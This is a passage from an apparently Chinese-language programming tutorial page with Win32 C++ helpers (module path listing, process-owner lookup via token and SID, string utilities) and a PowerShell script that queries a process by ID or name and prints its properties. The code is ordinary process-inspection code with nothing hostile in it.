MODULEENTRY32 me<span class="token punctuation">;</span>        me<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>MODULEENTRY32<span class="token punctuation">)</span><span class="token punctuation">;</span>        BOOL hasNext <span class="token operator">=</span> <span class="token function">Module32First</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> <span class="token operator">&amp;</span>me<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 进程模块列表迭代器</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>hasNext<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 第一个模块即进程自身, 可从中提取其可执行文件的完整路径</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"path: %s\n"</span><span class="token punctuation">,</span> <span class="token function">toChar</span><span class="token punctuation">(</span>me<span class="token punctuation">.</span>szExePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">CloseHandle</span><span class="token punctuation">(</span>hModule<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"==================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 获取进程归属用户</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">getProcessOwner</span><span class="token punctuation">(</span>DWORD pid<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token operator">*</span> owner <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">513</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span>owner <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>    HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_QUERY_INFORMATION<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>hProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> owner<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    HANDLE hToken <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    DWORD dwSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    TCHAR szUserName<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    TCHAR szDomain<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    DWORD dwDomainSize <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>    DWORD dwNameSize <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>    SID_NAME_USE SNU<span class="token punctuation">;</span>    PTOKEN_USER pTokenUser <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    __try <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">OpenProcessToken</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> TOKEN_QUERY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hToken<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            __leave<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetTokenInformation</span><span class="token punctuation">(</span>hToken<span class="token punctuation">,</span> TokenUser<span class="token punctuation">,</span> pTokenUser<span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwSize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> ERROR_INSUFFICIENT_BUFFER<span class="token punctuation">)</span> <span class="token punctuation">{</span>                __leave<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        pTokenUser <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        pTokenUser <span class="token operator">=</span> <span class="token punctuation">(</span>PTOKEN_USER<span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>dwSize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>pTokenUser <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            __leave<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetTokenInformation</span><span class="token punctuation">(</span>hToken<span class="token punctuation">,</span> TokenUser<span class="token punctuation">,</span> pTokenUser<span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwSize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            __leave<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">LookupAccountSid</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> pTokenUser<span class="token operator">-></span>User<span class="token punctuation">.</span>Sid<span class="token punctuation">,</span> szUserName<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwNameSize<span class="token punctuation">,</span> szDomain<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwDomainSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>SNU<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">sprintf</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> <span class="token string">"%s\\%s\0"</span><span class="token punctuation">,</span> <span class="token function">toChar</span><span class="token punctuation">(</span>szDomain<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">toChar</span><span class="token punctuation">(</span>szUserName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> __finally <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>pTokenUser <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">free</span><span class="token punctuation">(</span>pTokenUser<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> owner<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 比较两个字符串是否相同（忽略大小写）</span>bool <span class="token function">equal</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    bool flag <span class="token operator">=</span> false<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> b <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        flag <span class="token operator">=</span> true<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> b <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">stricmp</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 宽字符 -> ASCII字符</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">toChar</span><span class="token punctuation">(</span><span class="token keyword">const</span> wchar_t<span class="token operator">*</span> _wchar<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">WideCharToMultiByte</span><span class="token punctuation">(</span>CP_ACP<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _wchar<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> _char <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">WideCharToMultiByte</span><span class="token punctuation">(</span>CP_ACP<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _wchar<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> _char<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> _char<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 判断 str 是否以 substr 开头（忽略大小写）</span>bool <span class="token function">startwith</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> substr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    bool flag <span class="token operator">=</span> false<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>str <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> substr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            flag <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">strnicmp</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> substr<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PowserShell-源码"><a href="#PowserShell-源码" class="headerlink" title="PowserShell 源码"></a>PowserShell 源码</h2><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># get_process.ps1 </span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 进程信息查询脚本</span><span class="token comment" spellcheck="true"># Powershell Script 3.0+</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># 脚本使用方式:</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   通过进程号查询:</span><span class="token comment" spellcheck="true">#     .\get_process.ps1 -id 0</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   通过进程名查询:</span><span class="token comment" spellcheck="true">#     .\get_process.ps1 -name "powershell"</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># id: 进程ID（二选一）</span><span class="token comment" spellcheck="true"># name: 进程名称（二选一）</span><span class="token keyword">param</span><span class="token punctuation">(</span><span class="token namespace">[int]</span><span class="token variable">$id</span>=<span class="token operator">-</span>1<span class="token punctuation">,</span> <span class="token namespace">[string]</span><span class="token variable">$name</span>=<span class="token string">""</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 获取进程对象</span><span class="token keyword">function</span> Get<span class="token operator">-</span>Proc <span class="token punctuation">{</span>    <span class="token keyword">param</span><span class="token punctuation">(</span><span class="token namespace">[int]</span><span class="token variable">$id</span>=<span class="token operator">-</span>1<span class="token punctuation">,</span> <span class="token namespace">[string]</span><span class="token variable">$name</span>=<span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">Try</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">-gt</span> <span class="token operator">-</span>1<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$process</span> = <span class="token function">Get-Process</span> <span class="token operator">-</span>Id <span class="token variable">$id</span> <span class="token operator">-</span>ErrorAction Stop        <span class="token punctuation">}</span> <span class="token keyword">else</span>  <span class="token punctuation">{</span>            <span class="token variable">$process</span> = <span class="token function">Get-Process</span> <span class="token operator">-</span>Name <span class="token variable">$name</span> <span class="token operator">-</span>ErrorAction Stop        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token namespace">[Microsoft.PowerShell.Commands.ProcessCommandException]</span> <span class="token punctuation">{</span>        <span class="token function">Write-Warning</span> <span class="token string">"Process [id=<span class="token variable">$id</span>][name=<span class="token variable">$name</span>] has not exist"</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span>        <span class="token function">Write-Warning</span> <span class="token string">"Find Process[id=<span class="token variable">$id</span>][name=<span class="token variable">$name</span>] Error"</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$process</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 获取进程属主</span><span class="token keyword">function</span> Get<span class="token operator">-</span>Proc<span class="token operator">-</span>Owner <span class="token punctuation">{</span>    <span class="token keyword">param</span><span class="token punctuation">(</span><span class="token namespace">[int]</span><span class="token variable">$id</span>=<span class="token operator">-</span>1<span class="token punctuation">)</span>    <span class="token variable">$owner</span> = <span class="token string">""</span>    <span class="token keyword">Try</span> <span class="token punctuation">{</span>        <span class="token variable">$info</span> = <span class="token punctuation">(</span><span class="token function">Get-WmiObject</span> <span class="token operator">-</span><span class="token keyword">Class</span> Win32_Process <span class="token operator">-</span><span class="token keyword">Filter</span> <span class="token string">"Handle=<span class="token variable">$id</span>"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetOwner<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">.</span>ReturnValue <span class="token operator">-eq</span> 2<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$owner</span> = <span class="token string">'Unknow/Unknow'</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$owner</span> = <span class="token string">'{0}/{1}'</span> <span class="token operator">-</span>f <span class="token variable">$info</span><span class="token punctuation">.</span>Domain<span class="token punctuation">,</span> <span class="token variable">$info</span><span class="token punctuation">.</span>User        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span>        <span class="token function">Write-Warning</span> <span class="token string">"Find Process[id=<span class="token variable">$id</span>]'s owner Error"</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$owner</span><span class="token punctuation">}</span><span class="token variable">$process</span> = Get<span class="token operator">-</span>Proc <span class="token operator">-</span>id <span class="token variable">$id</span> <span class="token operator">-</span>name <span class="token variable">$name</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$owner</span> = Get<span class="token operator">-</span>Proc<span class="token operator">-</span>Owner <span class="token operator">-</span>id <span class="token variable">$id</span>    <span class="token variable">$process_inst</span> = Get<span class="token operator">-</span>CimInstance Win32_Process <span class="token operator">-</span><span class="token keyword">Filter</span> <span class="token string">"ProcessId = '<span class="token variable">$id</span>'"</span>    <span class="token variable">$fid</span> = <span class="token variable">$process_inst</span><span class="token punctuation">.</span>ParentProcessId    <span class="token function">Write-Host</span> <span class="token string">"---------------------------------------"</span>    <span class="token function">Write-Host</span> <span class="token string">"PID ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Id    <span class="token function">Write-Host</span> <span class="token string">"PPID ="</span> <span class="token variable">$fid</span>    <span class="token function">Write-Host</span> <span class="token string">"Name(ProcessName) ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Name    <span class="token function">Write-Host</span> <span class="token string">"Path ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Path    <span class="token function">Write-Host</span> <span class="token string">"Owner ="</span> <span class="token variable">$owner</span>    <span class="token function">Write-Host</span> <span class="token string">"Handle ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Handle    <span class="token function">Write-Host</span> <span class="token string">"Handles(Handlecount) ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Handles    <span class="token function">Write-Host</span> <span class="token string">"NPM(NonpagedSystemMemorySize) ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>NPM    <span class="token function">Write-Host</span> <span class="token string">"PM(PagedMemorySize) ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PM    <span class="token function">Write-Host</span> <span class="token string">"VM(VirtualMemorySize) ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>VM    <span class="token function">Write-Host</span> <span class="token string">"WS(WorkingSet) ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>WS    <span class="token function">Write-Host</span> <span class="token string">"BasePriority ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>BasePriority    <span class="token function">Write-Host</span> <span class="token string">"Container ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Container    <span class="token function">Write-Host</span> <span class="token string">"EnableRaisingEvents ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>EnableRaisingEvents    <span class="token function">Write-Host</span> <span class="token string">"ExitCode ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>ExitCode    <span class="token function">Write-Host</span> <span class="token string">"ExitTime ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>ExitTime    <span class="token function">Write-Host</span> <span class="token string">"HasExited ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>HasExited    <span class="token function">Write-Host</span> <span class="token string">"MachineName ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>MachineName    <span class="token function">Write-Host</span> <span class="token string">"MainModule ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>MainModule    <span class="token function">Write-Host</span> <span class="token string">"MainWindowHandle ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>MainWindowHandle    <span class="token function">Write-Host</span> <span class="token string">"MainWindowTitle ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>MainWindowTitle    <span class="token function">Write-Host</span> <span class="token string">"MaxWorkingSet ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>MaxWorkingSet    <span class="token function">Write-Host</span> <span class="token string">"MinWorkingSet ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>MinWorkingSet    <span class="token comment" spellcheck="true"># Write-Host "Modules =" $process.Modules</span>    <span class="token function">Write-Host</span> <span class="token string">"NonpagedSystemMemorySize ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>NonpagedSystemMemorySize    <span class="token function">Write-Host</span> <span class="token string">"NonpagedSystemMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>NonpagedSystemMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"NonPagedMemorySize ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>NonPagedMemorySize    <span class="token function">Write-Host</span> <span class="token string">"PagedMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PagedMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"PagedSystemMemorySize ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PagedSystemMemorySize    <span class="token function">Write-Host</span> <span class="token string">"PagedSystemMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PagedSystemMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"PeakPagedMemorySize ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PeakPagedMemorySize    <span class="token function">Write-Host</span> <span class="token string">"PeakPagedMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PeakPagedMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"PeakVirtualMemorySize ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PeakVirtualMemorySize    <span class="token function">Write-Host</span> <span class="token string">"PeakVirtualMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PeakVirtualMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"PeakWorkingSet ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PeakWorkingSet    <span class="token function">Write-Host</span> <span class="token string">"PeakWorkingSet64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PeakWorkingSet64    <span class="token function">Write-Host</span> <span class="token string">"PriorityBoostEnabled ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PriorityBoostEnabled    <span class="token function">Write-Host</span> <span class="token string">"PriorityClass ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PriorityClass    <span class="token function">Write-Host</span> <span class="token string">"PrivateMemorySize ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PrivateMemorySize    <span class="token function">Write-Host</span> <span class="token string">"PrivateMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PrivateMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"PrivilegedProcessorTime ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PrivilegedProcessorTime    <span class="token function">Write-Host</span> <span class="token string">"ProcessorAffinity ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>ProcessorAffinity    <span class="token function">Write-Host</span> <span class="token string">"Responding ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Responding    <span class="token function">Write-Host</span> <span class="token string">"SessionId ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>SessionId    <span class="token function">Write-Host</span> <span class="token string">"Site ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Site    <span class="token function">Write-Host</span> <span class="token string">"StandardError ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>StandardError    <span class="token function">Write-Host</span> <span class="token string">"StandardInput ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>StandardInput    <span class="token function">Write-Host</span> <span class="token string">"StandardOutput ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>StandardOutput    <span class="token function">Write-Host</span> <span class="token string">"StartInfo ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>StartInfo    <span class="token function">Write-Host</span> <span class="token string">"StartTime ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>StartTime    <span class="token function">Write-Host</span> <span class="token string">"SynchronizingObject ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>SynchronizingObject    <span class="token comment" spellcheck="true"># Write-Host "Threads =" $process.Threads</span>    <span class="token function">Write-Host</span> <span class="token string">"Threads.Count ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Threads<span class="token punctuation">.</span>Count    <span class="token function">Write-Host</span> <span class="token string">"TotalProcessorTime ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>TotalProcessorTime    <span class="token function">Write-Host</span> <span class="token string">"UserProcessorTime ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>UserProcessorTime    <span class="token function">Write-Host</span> <span class="token string">"VirtualMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>VirtualMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"WorkingSet ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>WorkingSet    <span class="token function">Write-Host</span> <span class="token string">"WorkingSet64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>WorkingSet64    <span class="token function">Write-Host</span> <span class="token string">"Company ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Company    <span class="token function">Write-Host</span> <span class="token string">"CPU ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>CPU    <span class="token function">Write-Host</span> <span class="token string">"Description ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Description    <span class="token function">Write-Host</span> <span class="token string">"FileVersion ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>FileVersion    <span class="token function">Write-Host</span> <span class="token string">"Product ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Product    <span class="token function">Write-Host</span> <span class="token string">"ProductVersion ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>ProductVersion    <span class="token comment" spellcheck="true"># Write-Host "PSConfiguration =" $process.PSConfiguration</span>    <span class="token comment" spellcheck="true"># Write-Host "PSResources =" $process.PSResources</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># 通过 Get-Member 命令可以获得 process 对象的所有属性</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#    TypeName: System.Diagnostics.Process</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Name                       MemberType     Definition</span><span class="token comment" spellcheck="true"># ----                       ----------     ----------</span><span class="token comment" spellcheck="true"># Handles                    AliasProperty  Handles = Handlecount</span><span class="token comment" spellcheck="true"># Name                       AliasProperty  Name = ProcessName</span><span class="token comment" spellcheck="true"># NPM                        AliasProperty  NPM = NonpagedSystemMemorySize</span><span class="token comment" spellcheck="true"># PM                         AliasProperty  PM = PagedMemorySize</span><span class="token comment" spellcheck="true"># VM                         AliasProperty  VM = VirtualMemorySize</span><span class="token comment" spellcheck="true"># WS                         AliasProperty  WS = WorkingSet</span><span class="token comment" spellcheck="true"># Disposed                   Event          System.EventHandler Disposed(System.Object, System.EventArgs)</span><span class="token comment" spellcheck="true"># ErrorDataReceived          Event          System.Diagnostics.DataReceivedEventHandler ErrorDataReceived(System.Objec...</span><span class="token comment" spellcheck="true"># Exited                     Event          System.EventHandler Exited(System.Object, System.EventArgs)</span><span class="token comment" spellcheck="true"># OutputDataReceived         Event          System.Diagnostics.DataReceivedEventHandler OutputDataReceived(System.Obje...</span><span class="token comment" spellcheck="true"># BeginErrorReadLine         Method         void BeginErrorReadLine()</span><span class="token comment" spellcheck="true"># BeginOutputReadLine        Method         void 